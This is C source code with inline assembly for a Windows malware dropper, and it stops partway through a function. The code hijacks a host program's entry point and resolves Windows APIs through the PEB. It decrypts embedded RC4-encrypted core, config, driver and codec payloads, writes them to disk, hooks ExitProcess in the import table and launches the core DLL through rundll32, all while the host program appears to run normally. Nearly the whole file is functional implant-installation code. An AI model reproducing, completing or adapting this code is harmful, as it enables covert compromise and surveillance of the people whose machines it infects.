#include <wtypes.h>
#include <time.h>

#include "DropperCode.h"
#include "XRefNames.h"
#include "rc4.h"

#ifdef WIN32

#define PRINT_MESSAGE(msg, x) if (_DEBUG) do { \
	char* OEPstr = (char*) pfn_VirtualAlloc(NULL, 256, MEM_COMMIT, PAGE_READWRITE); \
	pfn_sprintf(OEPstr, STRING(msg), x); \
	pfn_OutputDebugString(OEPstr); \
	pfn_VirtualFree(OEPstr, 0, MEM_RELEASE); \
} while (0)

unsigned char JMPcode[] = { 0xE9, };

/*
 	uncomment if verbose debug needed
*/

#ifdef _DEBUG
#pragma message("")
#pragma message("****************************")
#pragma message("***** NOT FOR RELEASE ******")
#pragma message("*** VERBOSE MODE ENABLED ***")
#pragma message("****************************")
#pragma message("")
#endif

XREFNAMES data_imports[] = {
	
	{ "KERNEL32.DLL", 
	{
		"OutputDebugStringA",	// 0 / ref offset = 0
			"CreateFileA",			// 1 / ref offset = 4
			"CreateDirectoryA",		// 2
			"CloseHandle",			// 3
			"WriteFile",			// 4
			"ReadFile",				// 5
			"SetFilePointer",		// 6
			"GetModuleFileNameW",	// 7
			"VirtualAlloc",			// 8
			"VirtualFree",			// 9
			"VirtualProtect",		// 10
			"WinExec",				// 11
			"FreeLibrary",			// 12
			"GetEnvironmentVariableA", // 13
			"SetCurrentDirectoryA",  // 14
			"SetFileAttributesA",	// 15
			"DebugActiveProcess",	// 16
			"GetCurrentProcessID",	// 17
			"CreateThread",			// 18
			"GetThreadContext",		// 19
			"SetThreadContext",		// 20
			"GetFileSize",			// 21
			"Sleep",				// 22
			"GetLastError",         // 23
			"ExitProcess",          // 24
			"LoadLibraryA",			// 25
			"GetProcAddress",		// 26
			"VirtualQuery",			// 27
			"VerifyVersionInfoA",	// 28
			"GetVersionExA",		// 29
			NULL
	}
	}, // KERNEL32.DLL
	
	{ "MSVCRT.DLL",
	{
		"sprintf",				// 30
		"exit",					// 31
		NULL
	} 
	}, // USER32.DLL
	
	{ "ADVAPI32.DLL",
	{
		"GetCurrentHwProfileA", // 32
	}
	}, // ADVAPI32.DLL

	{ NULL, { NULL } }
};

char * _needed_strings[] = {
	// index 0 is reserved for executable name
	// index 1 is reserved for installation dir
	"TMP",					// 2
	"TEMP",					// 3
	"KERNEL32.DLL",			// 4
	"MSVCRT.DLL",			// 5
	"LoadLibraryA",			// 6
	"GetProcAddress",		// 7
	"%systemroot%\\System32\\rundll32.exe \"", // 8
	"\",HFF8",				// 9
	"HFF5",					// 10
	"\\",					// 11
	"USER32.DLL",			// 12
	
#ifdef _DEBUG
	"Error creating directory", // 13
	"ExitProcess index %d", // 14
	"ExitProcess hooked",   // 15
	"Restoring OEP code",	// 16
	"exit hooked",			// 17
	"OEP restored!",		// 18
	"Calling OEP @ %08x",	// 19
	"Error creating file",  // 20
	"Calling HFF5 ...",		// 21
	"HFF5 called!",			// 22
	"In ExitProcess Hook",  // 23
	"Quitting vector NOW!", // 24
	"VerifyVersionInfo @ %08x", // 25
	"Sys MajorVersion %d", // 26
	"Sys MinorVersion %d", // 27
#endif

	NULL
};
/*
	"calc.exe", 		    // 4
	"Writing core file\n",	// 5
	"Writing config file\n",// 6
	"Writing codec file\n",	// 7
	"Writing driver file\n",// 8
	
	
	

	"ExitProcess",			// 13
	"Address %08x",			// 14
	"LoadLibraryA",			// 15
	"GetProcAddress",		// 16
	
	"%systemroot%\\System32\\rundll32.exe \"", // 18
	"%temp%",				// 19
	"%tmp%",				// 20	
	"\\",					// 21
	"\",HFF8",				// 22
	"HFF5",					// 23
	
	"ERROR CODE %08x",		// 25
	
	
	
	"exit",					// 29
	"Len %d",				// 30
	
	"OEP %08x",				// 32
	"ITD %08x",				// 33
	
	
	
	
	NULL
};
*/

BYTE oepStub[OEPSTUBSIZE] = {
	0x33, 0xc0,						// xor eax, eax
	0xb8, 0x00, 0x00, 0xff, 0xff,	// mov eax, dropperEP.ffff0000	[byte 5 and 6 to be patched]
	0xb4, 0xff,						// mov ah,  dropperEP.0000ff00	[byte 9 to be patched]
	0xb0, 0xff,      				// mov al,  dropperEP.000000ff	[byte 13 to be patched]
	0xeb, 0xff, 0xf0,				// PUSH EAX
	0x59,							// pop ecx
	0xeb, 0xff, 0xf1,				// PUSH ECX
	0x58,							// pop eax
	0xeb, 0xff, 0xc0,				// INC EAX
	0x0e,							// PUSH CS
	0xeb, 0xff, 0xf0,				// PUSH EAX
	0xc3     						// jmp ecx
};

#pragma optimize( "", off ) // *** Disable all optimizations - we need code "as is"!
#pragma code_seg(".extcd")  // *** Lets put all functions in a separated code segment

int __stdcall NewEntryPoint()
{	
	DWORD dwCurrentAddr = 0;
	DWORD OEP = 0;
	
	// Get current EIP in dwCurrentAddr
	__asm {
		call lbl_ref1
	lbl_ref1:
		pop dwCurrentAddr
	}
	
	// *** Find the ending marker of data section <E> 
	DWORD dwMagic = 0;
	while ( dwMagic != 0x003E453C )
		dwMagic = (DWORD)(*(DWORD *)(--dwCurrentAddr));
	
	// *** Total size of data section
	dwCurrentAddr -= sizeof(DWORD);
	DWORD dwDataSize = (DWORD)(*(DWORD*)(dwCurrentAddr));
	
	// *** Pointer to data section header
	DataSectionHeader *header = (DataSectionHeader*) (dwCurrentAddr - dwDataSize);
	
	DWORD * stringsOffsets = (DWORD *) (((char*)header) + header->stringsOffsets.offset);
	char * strings = (char *) (((char*)header) + header->strings.offset);
	char * dlls = (char *) (((char*)header) + header->dlls.offset);
	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
	
	//
	// *** Get address of needed calls through PEB
	//
	LOADLIBRARY    pfn_LoadLibrary	   = 0;
	GETPROCADDRESS pfn_GetProcAddress  = 0;
	
	PEB_LIST_ENTRY* head;
	DWORD **pPEB;
	DWORD *Ldr;
	
	// *** get PEB
	__asm {
		MOV EAX,30h
		MOV EAX,DWORD PTR FS:[EAX]
		ADD EAX, 08h
		MOV SS:[pPEB], EAX
	}
	
	Ldr = *(pPEB + 1);
	head = (PEB_LIST_ENTRY *) *(Ldr + 3);
	
	PEB_LIST_ENTRY* entry = head;
	do {		
		DWORD imageBase = entry->ImageBase;
		if (imageBase == NULL)
			goto NEXT_ENTRY;
		
		IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*) entry->ImageBase;
		IMAGE_NT_HEADERS32* ntHeaders = (IMAGE_NT_HEADERS32*) (entry->ImageBase + dosHeader->e_lfanew);
		
		// *** check if we have an export table
		if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == NULL)
			goto NEXT_ENTRY;
		
		// *** get EXPORT table
		IMAGE_EXPORT_DIRECTORY* exportDirectory = 
			(IMAGE_EXPORT_DIRECTORY*) (imageBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
		
		// *** check for valid module name
		char* moduleName = (char*)(imageBase + exportDirectory->Name);
		if (moduleName == NULL)
			goto NEXT_ENTRY;
		
		if ( ! _STRCMPI_(moduleName, STRING(STRIDX_KERNEL32_DLL)) ) 
		{
			if (exportDirectory->AddressOfFunctions == NULL) goto NEXT_ENTRY;
			if (exportDirectory->AddressOfNames == NULL) goto NEXT_ENTRY;
			if (exportDirectory->AddressOfNameOrdinals == NULL) goto NEXT_ENTRY;
			
			DWORD* Functions = (DWORD*) (imageBase + exportDirectory->AddressOfFunctions);
			DWORD* Names = (DWORD*) (imageBase + exportDirectory->AddressOfNames);			
			WORD* NameOrds = (WORD*) (imageBase + exportDirectory->AddressOfNameOrdinals);
			
			// *** get pointers to LoadLibraryA and GetProcAddress entry points
			for (WORD x = 0; x < exportDirectory->NumberOfFunctions; x++)
			{
				if (Functions[x] == 0)
					continue;
				
				for (WORD y = 0; y < exportDirectory->NumberOfNames; y++)
				{
					if (NameOrds[y] == x)
					{
						char *name = (char *) (imageBase + Names[y]);
						if (name == NULL)
							continue;
						
						if (!_STRCMPI_(STRING(STRIDX_LOADLIBRARYA), name)) {
							pfn_LoadLibrary = (LOADLIBRARY) (imageBase + Functions[x]);
						} else if (!_STRCMPI_(STRING(STRIDX_GETPROCADDRESS), name)) {
							pfn_GetProcAddress = (GETPROCADDRESS) (imageBase + Functions[x]);
						}
						break;
					}
				}
			}
		}
NEXT_ENTRY:
		entry = (PEB_LIST_ENTRY *) entry->InLoadNext;
	
	} while (entry != head);

	//
	// *** Fix call addresses
	//
	
	DWORD callIndex = 0;
	char * ptr = dlls;
	while (ptr < (dlls + header->dlls.size)) {
		// get number of calls
		DWORD nCalls = *((DWORD*)ptr);
		ptr += sizeof(DWORD);
		// get name of dll
		char * dllName = ptr;
		
		// load dll
		HMODULE hMod = pfn_LoadLibrary(dllName);
				
		ptr += _STRLEN_(dllName) + 1;
		for (DWORD i = 0; i < nCalls; i++) {		
			
			// store address of call
			dll_calls[callIndex] = (DWORD) pfn_GetProcAddress(hMod, ptr);
			
			callIndex++;
			ptr += _STRLEN_(ptr) + 1;
		}
	}
	
	// *** map call addresses to function pointers
	
#ifdef _DEBUG
	OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
#endif	
	
	CREATEFILE pfn_CreateFile = (CREATEFILE) dll_calls[CALL_CREATEFILEA];
	CREATEDIRECTORY pfn_CreateDirectory = (CREATEDIRECTORY) dll_calls[CALL_CREATEDIRECTORYA];
	CLOSEHANDLE pfn_CloseHandle = (CLOSEHANDLE) dll_calls[CALL_CLOSEHANDLE];
	WRITEFILE pfn_WriteFile = (WRITEFILE) dll_calls[CALL_WRITEFILE];
	READFILE pfn_ReadFile = (READFILE) dll_calls[CALL_READFILE];
	SETFILEPOINTER pfn_SetFilePointer = (SETFILEPOINTER) dll_calls[CALL_SETFILEPOINTER];
	GETMODULEFILENAME pfn_GetModuleFileName = (GETMODULEFILENAME) dll_calls[CALL_GETMODULEFILENAMEW];
	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) dll_calls[CALL_VIRTUALALLOC];
	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) dll_calls[CALL_VIRTUALFREE];
	VIRTUALPROTECT pfn_VirtualProtect = (VIRTUALPROTECT) dll_calls[CALL_VIRTUALPROTECT];
	WINEXEC pfn_WinExec = (WINEXEC) dll_calls[CALL_WINEXEC];
	FREELIBRARY pfn_FreeLibrary = (FREELIBRARY) dll_calls[CALL_FREELIBRARY];
	GETENVIRONMENTVARIABLE pfn_GetEnvironmentVariable = (GETENVIRONMENTVARIABLE) dll_calls[CALL_GETENVIRONMENTVARIABLEA];
	SETCURRENTDIRECTORY pfn_SetCurrentDirectory = (SETCURRENTDIRECTORY) dll_calls[CALL_SETCURRENTDIRECTORYA];
	SETFILEATTRIBUTES pfn_SetFileAttributes = (SETFILEATTRIBUTES) dll_calls[CALL_SETFILEATTRIBUTESA];
	DEBUGACTIVEPROCESS pfn_DebugActiveProcess = (DEBUGACTIVEPROCESS) dll_calls[CALL_DEBUGACTIVEPROCESS];
	GETCURRENTPROCESSID pfn_GetCurrentProcessID = (GETCURRENTPROCESSID) dll_calls[CALL_GETCURRENTPROCESSID];
	CREATETHREAD pfn_CreateThread = (CREATETHREAD) dll_calls[CALL_CREATETHREAD];
	GETTHREADCONTEXT pfn_GetThreadContext = (GETTHREADCONTEXT) dll_calls[CALL_GETTHREADCONTEXT];
	SETTHREADCONTEXT pfn_SetThreadContext = (SETTHREADCONTEXT) dll_calls[CALL_SETTHREADCONTEXT];
	GETFILESIZE pfn_GetFileSize = (GETFILESIZE) dll_calls[CALL_GETFILESIZE];
	SLEEP pfn_Sleep = (SLEEP) dll_calls[CALL_SLEEP];
	GETLASTERROR pfn_GetLastError = (GETLASTERROR) dll_calls[CALL_GETLASTERROR];
	SPRINTF pfn_sprintf = (SPRINTF) dll_calls[CALL_SPRINTF];
	VIRTUALQUERY pfn_VirtualQuery = (VIRTUALQUERY) dll_calls[CALL_VIRTUALQUERY];
	VERIFYVERSIONINFO pfn_VerifyVersionInfo = (VERIFYVERSIONINFO) dll_calls[CALL_VERIFYVERSIONINFO];
	GETVERSIONEX pfn_GetVersionEx = (GETVERSIONEX) dll_calls[CALL_GETVERSIONEX];
	GETCURRENTHWPROFILE pfn_GetCurrentHwProfile = (GETCURRENTHWPROFILE) dll_calls[CALL_GETCURRENTHWPROFILE];
	
	//
	// TODO shared memory check
	//
	//	Core shared memory already present, call OEP
	//  Check if core has been compiled in demo version (demo symbol present?):
	//		YES: skip this check
	//		NO : check present
	//
	
	// Verify we are not running on Windows 7 or later
	
	DWORD imageBase = 0;
	
	__asm {
		push eax
			push ebx
			mov eax, fs:[30h]
		mov ebx, [eax+8]
		mov imageBase, ebx
			pop ebx
			pop eax
	}
	
	// loop IAT lookin for ExitProcess
	IMAGE_DOS_HEADER * dosHeader = (IMAGE_DOS_HEADER *) imageBase;
	IMAGE_NT_HEADERS * ntHeaders = (IMAGE_NT_HEADERS *) (((PBYTE)dosHeader) + dosHeader->e_lfanew);
	
	//
	// GOTO OEP_CALL FROM NOW ON ONLY!!!
	//
	
	OSVERSIONINFOA* osVersion = (OSVERSIONINFOA*) pfn_VirtualAlloc(NULL, sizeof(OSVERSIONINFOA), MEM_COMMIT, PAGE_READWRITE);
	_MEMSET_(osVersion, 0, sizeof(OSVERSIONINFOA));
	osVersion->dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
	BOOL bVersion = pfn_GetVersionEx(osVersion);
	if (!bVersion)
		goto OEP_CALL;

	PRINT_MESSAGE(STRIDX_SYSMAJORVER, osVersion->dwMajorVersion);
	PRINT_MESSAGE(STRIDX_SYSMINORVER, osVersion->dwMinorVersion);

	if (osVersion->dwMajorVersion >= 6 && osVersion->dwMinorVersion >= 1)
		goto OEP_CALL;

	pfn_VirtualFree(osVersion, 0, MEM_RELEASE);

	// Get user temporary directory
	char * lpTmpEnvVar = STRING(STRIDX_TMP_ENVVAR);
	char * lpTmpDir = (char*) pfn_VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
	_ZEROMEM_(lpTmpDir, MAX_PATH);
	DWORD dwRet = pfn_GetEnvironmentVariable(lpTmpEnvVar, lpTmpDir, MAX_PATH);
	if (dwRet == 0) {
		char * lpTempEnvVar = STRING(STRIDX_TEMP_ENVVAR);
		dwRet = pfn_GetEnvironmentVariable(lpTempEnvVar, lpTmpDir, MAX_PATH);
		if (dwRet == 0) {
			// we are unable to get the user TMP or TEMP directory,
			// so call the OEP ... we failed!
			pfn_VirtualFree(lpTmpDir, 0, MEM_RELEASE);
			goto OEP_CALL;
		}
	}
	
	// Go back one level (i.e. from Temp to its parent directory)
	
#ifdef _DEBUG
	pfn_OutputDebugString(lpTmpDir);
#endif

	if ( lpTmpDir[_STRLEN_(lpTmpDir)] == '\\' )
		lpTmpDir[_STRLEN_(lpTmpDir)] = '\0';
	
#ifdef _DEBUG
	pfn_OutputDebugString(lpTmpDir);
#endif
	
	char* dirsep = _STRRCHR_(lpTmpDir, '\\');
	if (dirsep != 0)
		*dirsep = '\0';	// cut the part after the last directory separator
	else
		goto OEP_CALL;
	
#ifdef _DEBUG
	pfn_OutputDebugString(lpTmpDir);
#endif
	
	_STRCAT_(lpTmpDir, STRING(STRIDX_DIRSEP));
#ifdef _DEBUG
	pfn_OutputDebugString(lpTmpDir);
#endif
	_STRCAT_(lpTmpDir, STRING(STRIDX_INSTALL_DIR)); // lpInstDir);
#ifdef _DEBUG
	pfn_OutputDebugString(lpTmpDir);
#endif
	_STRCAT_(lpTmpDir, STRING(STRIDX_DIRSEP));
	
	// TODO remove debug string
#ifdef _DEBUG
	pfn_OutputDebugString(lpTmpDir);
#endif
	
	BOOL bRet = pfn_CreateDirectory(lpTmpDir, NULL);
	if (bRet == FALSE) {

		// TODO remove debug string
#ifdef _DEBUG
		pfn_OutputDebugString(STRING(STRIDX_ERRORCREDIR));
#endif

		DWORD dwLastError = pfn_GetLastError();
		
		// TODO remove debug string
		/*
		char* error = (char*) pfn_VirtualAlloc(NULL, 256, MEM_COMMIT, PAGE_READWRITE);
		pfn_sprintf(error, STRING(STRIDX_ERRORCODE), dwLastError);
		pfn_OutputDebugString(error);
		pfn_VirtualFree(error, 0, MEM_RELEASE);
		*/
		
		switch (dwLastError) {
			case ERROR_ALREADY_EXISTS:
				// go on, simply overwrite all files
				break;
			case ERROR_PATH_NOT_FOUND:
				// mmmh ... something wrong here, user temp dir should be present!

				// TODO remove debug string
				//pfn_OutputDebugString(STRING(STRIDX_ERRORCREDIR));

				pfn_VirtualFree(lpTmpDir, 0, MEM_RELEASE);
				goto OEP_CALL;
				break;
		}
	}
	
	// directory created or already present, so jump into it
	pfn_SetCurrentDirectory(lpTmpDir);
	
	_STRCAT_(lpTmpDir, (char *) (((char*)header) + header->files.names.core.offset));
	header->dllPath = lpTmpDir;
	
	//
	// write the files
	//
	DUMPFILE pfn_DumpFile = (DUMPFILE) (((char*)header) + header->functions.dumpFile.offset);
	
	RC4_SKIP pfn_rc4skip = (RC4_SKIP) (((char*)header) + header->functions.rc4.offset);
#define RC4_SKIP(buf, buf_len, key, key_len, header) pfn_rc4skip((unsigned char*)key, key_len, 0, (unsigned char*)buf, buf_len, header)
	
	// CORE
	if (header->files.core.offset != 0 && header->files.core.size != 0) {
		CHAR* fileName = (char *) (((char*)header) + header->files.names.core.offset);
		CHAR* fileData = (char *) (((char*)header) + header->files.core.offset);
		RC4_SKIP(fileData, header->files.core.size, header->rc4key, RC4KEYLEN, header);
		BOOL ret = pfn_DumpFile(fileName, fileData, header->files.core.size, header);
		if (ret == FALSE)
			goto OEP_CALL;
	}
	
	// CONFIG
	if (header->files.config.offset != 0 && header->files.config.size != 0) {
		CHAR* fileName = (char *) (((char*)header) + header->files.names.config.offset);
		CHAR* fileData = (char *) (((char*)header) + header->files.config.offset);
		RC4_SKIP(fileData, header->files.config.size, header->rc4key, RC4KEYLEN, header);
		BOOL ret = pfn_DumpFile(fileName, fileData, header->files.config.size, header);
		if (ret == FALSE)
			goto OEP_CALL;
	}
	
	// DRIVER
	if (header->files.driver.offset != 0 && header->files.driver.size != 0) {
		CHAR* fileName = (char *) (((char*)header) + header->files.names.driver.offset);
		CHAR* fileData = (char *) (((char*)header) + header->files.driver.offset);
		RC4_SKIP(fileData, header->files.driver.size, header->rc4key, RC4KEYLEN, header);
		BOOL ret = pfn_DumpFile(fileName, fileData, header->files.driver.size, header);
		if (ret == FALSE)
			goto OEP_CALL;
	}
	
	// CODEC
	if (header->files.codec.offset != 0 && header->files.codec.size != 0) {
		CHAR* fileName = (char *) (((char*)header) + header->files.names.codec.offset);
		CHAR* fileData = (char *) (((char*)header) + header->files.codec.offset);
		RC4_SKIP(fileData, header->files.codec.size, header->rc4key, RC4KEYLEN, header);
		BOOL ret = pfn_DumpFile(fileName, fileData, header->files.codec.size, header);
		if (ret == FALSE)
			goto OEP_CALL;
	}
	
	// Hook ExitProcess	
	UINT_PTR IAT_rva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
	IMAGE_IMPORT_DESCRIPTOR const * lpImp = (IMAGE_IMPORT_DESCRIPTOR *)((UINT_PTR)imageBase + IAT_rva);
	
	EXITPROCESS pfn_ExitProcessHook = (EXITPROCESS)( ((char*)header) + header->functions.exitProcessHook.offset);
	EXIT pfn_ExitHook = (EXIT) ( ((char*)header) + header->functions.exitHook.offset);
	
#ifdef _DEBUG
	PRINT_MESSAGE(STRIDX_EXITPROCIDX, header->exitProcessIndex);
#endif
	
	if (header->exitProcessIndex >= 0) {
		while (lpImp->Name) {
			CHAR* dllName_RO = (CHAR*)((UINT_PTR)imageBase) + lpImp->Name;
			CHAR* dllName = (CHAR*) pfn_VirtualAlloc(NULL, _STRLEN_(dllName_RO) + 1, MEM_COMMIT, PAGE_READWRITE);
			if (!dllName)
				goto OEP_CALL;

			_MEMCPY_(dllName, dllName_RO, _STRLEN_(dllName_RO) + 1);

			if (! _STRCMPI_( dllName, STRING(STRIDX_KERNEL32_DLL) ) ) {

#ifdef _DEBUG
				pfn_OutputDebugString(dllName);
#endif

				UINT_PTR dwOriginalThunk = (lpImp->OriginalFirstThunk ? lpImp->OriginalFirstThunk : lpImp->FirstThunk);
				IMAGE_THUNK_DATA const *itd = (IMAGE_THUNK_DATA *)(imageBase + dwOriginalThunk);
				
				UINT_PTR dwThunk = lpImp->FirstThunk;
				
				// skip to ExitProcess thunk
				itd += header->exitProcessIndex;
				dwThunk += sizeof(DWORD) * header->exitProcessIndex;

				IMAGE_IMPORT_BY_NAME const * name_import = (IMAGE_IMPORT_BY_NAME *)(imageBase + itd->u1.AddressOfData);

				DWORD oldProtect = 0;

				MEMORY_BASIC_INFORMATION * mbi = 
					(MEMORY_BASIC_INFORMATION *) 
					pfn_VirtualAlloc(
					NULL, 
					sizeof(MEMORY_BASIC_INFORMATION), 
					MEM_COMMIT, 
					PAGE_READWRITE);
				
				DWORD* ptrToCallAddr = (DWORD*) (ntHeaders->OptionalHeader.ImageBase + dwThunk);
				
				SIZE_T size = pfn_VirtualQuery((LPCVOID)ptrToCallAddr, mbi, sizeof(MEMORY_BASIC_INFORMATION));
				pfn_VirtualProtect(mbi->BaseAddress, mbi->RegionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
				*ptrToCallAddr = (DWORD) pfn_ExitProcessHook;
				pfn_VirtualProtect(mbi->BaseAddress, mbi->RegionSize, oldProtect, NULL);
				
				pfn_VirtualFree(mbi, 0, MEM_RELEASE);
				
#ifdef _DEBUG
				pfn_OutputDebugString(STRING(STRIDX_EXITPROCHOOKED));
#endif
			}
			
			pfn_VirtualFree(dllName, 0, MEM_RELEASE);
			
			lpImp++;
		}
	}
	
	lpImp = (IMAGE_IMPORT_DESCRIPTOR *)((UINT_PTR)imageBase + IAT_rva);
	
	if (header->exitIndex >= 0) {
		while (lpImp->Name) {
			CHAR* dllName_RO = (CHAR*)((UINT_PTR)imageBase) + lpImp->Name;
			CHAR* dllName = (CHAR*) pfn_VirtualAlloc(NULL, _STRLEN_(dllName_RO) + 1, MEM_COMMIT, PAGE_READWRITE);
			if (!dllName)
				goto OEP_CALL;
			
			_MEMCPY_(dllName, dllName_RO, _STRLEN_(dllName_RO) + 1);
			
			if (! _STRCMPI_( dllName, STRING(STRIDX_MSVCRT_DLL) ) ) {
			
#ifdef _DEBUG
				pfn_OutputDebugString(dllName);
#endif

				UINT_PTR dwOriginalThunk = (lpImp->OriginalFirstThunk ? lpImp->OriginalFirstThunk : lpImp->FirstThunk);
				IMAGE_THUNK_DATA const *itd = (IMAGE_THUNK_DATA *)(imageBase + dwOriginalThunk);

				UINT_PTR dwThunk = lpImp->FirstThunk;

				// skip to ExitProcess thunk
				itd += header->exitIndex;
				dwThunk += sizeof(DWORD) * header->exitIndex;
				
				IMAGE_IMPORT_BY_NAME const * name_import = (IMAGE_IMPORT_BY_NAME *)(imageBase + itd->u1.AddressOfData);
				
				DWORD oldProtect = 0;
				
				MEMORY_BASIC_INFORMATION * mbi = 
					(MEMORY_BASIC_INFORMATION *) 
					pfn_VirtualAlloc(
					NULL, 
					sizeof(MEMORY_BASIC_INFORMATION), 
					MEM_COMMIT, 
					PAGE_READWRITE);
				
				DWORD* ptrToCallAddr = (DWORD*) (ntHeaders->OptionalHeader.ImageBase + dwThunk);
				
				SIZE_T size = pfn_VirtualQuery((LPCVOID)ptrToCallAddr, mbi, sizeof(MEMORY_BASIC_INFORMATION));
				pfn_VirtualProtect(mbi->BaseAddress, mbi->RegionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
				*ptrToCallAddr = (DWORD) pfn_ExitHook;
				pfn_VirtualProtect(mbi->BaseAddress, mbi->RegionSize, oldProtect, NULL);
				
				pfn_VirtualFree(mbi, 0, MEM_RELEASE);
				
#ifdef _DEBUG
				pfn_OutputDebugString(STRING(STRIDX_EXITHOOKED));
#endif
			}
			
			pfn_VirtualFree(dllName, 0, MEM_RELEASE);
			
			lpImp++;
		}
	}

	// Spawn thread to run core dll
	
	THREADPROC pfn_CoreThreadProc = (THREADPROC)(((char*)header) + header->functions.coreThread.offset); 
	pfn_CreateThread(NULL, 0, pfn_CoreThreadProc, header, 0, NULL);

OEP_CALL:

	//
	// *** Restore OEP code
	//
	
	OEP = ntHeaders->OptionalHeader.ImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
	
#ifdef _DEBUG
	pfn_OutputDebugString(STRING(STRIDX_RESTOREOEP));
#endif
	
	if (header->originalOEPCode.offset != 0)
	{
		DWORD oldProtect = 0;
		char* OEPcode = (char *) (((char*)header) + header->originalOEPCode.offset);
		size_t OEPsize = header->originalOEPCode.size;
		
		pfn_VirtualProtect((LPVOID)OEP, OEPsize, PAGE_EXECUTE_READWRITE, &oldProtect);		
		_MEMCPY_((char*)(OEP), OEPcode, OEPsize);
		pfn_VirtualProtect((LPVOID)OEP, OEPsize, oldProtect, &oldProtect);
	}
	
#ifdef _DEBUG
	pfn_OutputDebugString(STRING(STRIDX_OEPRESTORED));
#endif
	
	PRINT_MESSAGE(STRIDX_CALLINGOEP, OEP);
	
#if 0
	__asm {
		popad
	}
#endif
	
	((WINSTARTFUNC)OEP)();
	
	return 0;
}
FUNCTION_END(NewEntryPoint);


BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD fileSize, DataSectionHeader *header)
{
	DWORD * stringsOffsets = (DWORD *) (((char*)header) + header->stringsOffsets.offset);
	char * strings = (char *) (((char*)header) + header->strings.offset);
	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
	
	OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
	SETFILEATTRIBUTES pfn_SetFileAttributes = (SETFILEATTRIBUTES) dll_calls[CALL_SETFILEATTRIBUTESA];
	CREATEFILE pfn_CreateFile = (CREATEFILE) dll_calls[CALL_CREATEFILEA];
	WRITEFILE pfn_WriteFile = (WRITEFILE) dll_calls[CALL_WRITEFILE];
	CLOSEHANDLE pfn_CloseHandle = (CLOSEHANDLE) dll_calls[CALL_CLOSEHANDLE];
	
	// create or open the file for overwriting
#ifdef _DEBUG
	pfn_OutputDebugString(fileName);
#endif

	// restore normal attributes if the file already exists
	pfn_SetFileAttributes(fileName, FILE_ATTRIBUTE_NORMAL);
	
	HANDLE hFile = pfn_CreateFile(fileName, 
		GENERIC_READ | GENERIC_WRITE, 
		0, 
		NULL, 
		CREATE_ALWAYS, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
#ifdef _DEBUG
		pfn_OutputDebugString(STRING(STRIDX_CREATEFILE_ERR));
#endif
		return FALSE;
	}
	
	// write data to file
	DWORD cbWritten = 0;
	BOOL bRet = pfn_WriteFile(hFile, fileData, fileSize, &cbWritten, NULL);
	if (bRet == FALSE)
		return FALSE;
	
	// close it
	pfn_CloseHandle(hFile);
	
	return TRUE;
}
FUNCTION_END(DumpFile);


DWORD WINAPI CoreThreadProc(__in  LPVOID lpParameter)
{	
	DataSectionHeader* header = (DataSectionHeader*) lpParameter;
	
	DWORD* stringsOffsets = (DWORD *) (((char*)header) + header->stringsOffsets.offset);
	char * strings = (char *) (((char*)header) + header->strings.offset);
	char * dlls = (char *) (((char*)header) + header->dlls.offset);
	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
	
	OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
	SLEEP pfn_Sleep = (SLEEP) dll_calls[CALL_SLEEP];
	WINEXEC pfn_WinExec = (WINEXEC) dll_calls[CALL_WINEXEC];
	FREELIBRARY pfn_FreeLibrary = (FREELIBRARY) dll_calls[CALL_FREELIBRARY];
	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) dll_calls[CALL_VIRTUALALLOC];
	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) dll_calls[CALL_VIRTUALFREE];
	GETPROCADDRESS pfn_GetProcAddress = (GETPROCADDRESS) dll_calls[CALL_GETPROCADDRESS];
	LOADLIBRARY pfn_LoadLibrary = (LOADLIBRARY) dll_calls[CALL_LOADLIBRARY];
	
	char* complete_path = (char*) pfn_VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
	
	_MEMCPY_( complete_path, STRING(STRIDX_RUNDLL), STRLEN(STRIDX_RUNDLL) );
	_STRCAT_( complete_path, header->dllPath);
	_STRCAT_( complete_path, STRING(STRIDX_COMMAHFF8));
	
#ifdef _DEBUG
	pfn_OutputDebugString(complete_path);
#endif
	
	HMODULE hLib = pfn_LoadLibrary(header->dllPath);
	if (hLib == INVALID_HANDLE_VALUE)
		goto THREAD_EXIT;
	
	HFF5 pfn_HFF5 = (HFF5) pfn_GetProcAddress(hLib, STRING(STRIDX_HFF5));
	if (pfn_HFF5 == NULL)
		goto THREAD_EXIT;
	
	STARTUPINFO* startupinfo = (STARTUPINFO*) pfn_VirtualAlloc(NULL, sizeof(STARTUPINFO), MEM_COMMIT, PAGE_READWRITE);
	startupinfo->cb = sizeof(STARTUPINFO);
	
	PROCESS_INFORMATION* procinfo = (PROCESS_INFORMATION*) pfn_VirtualAlloc(NULL, sizeof(PROCESS_INFORMATION), MEM_COMMIT, PAGE_READWRITE);
	
	// *
	// ** INJECT CORE !!!
	// *
	
#ifdef _DEBUG
	pfn_OutputDebugString(STRING(STRIDX_HFF5CALLING));
#endif	

	pfn_HFF5(complete_path, NULL, startupinfo, procinfo);

#ifdef _DEBUG
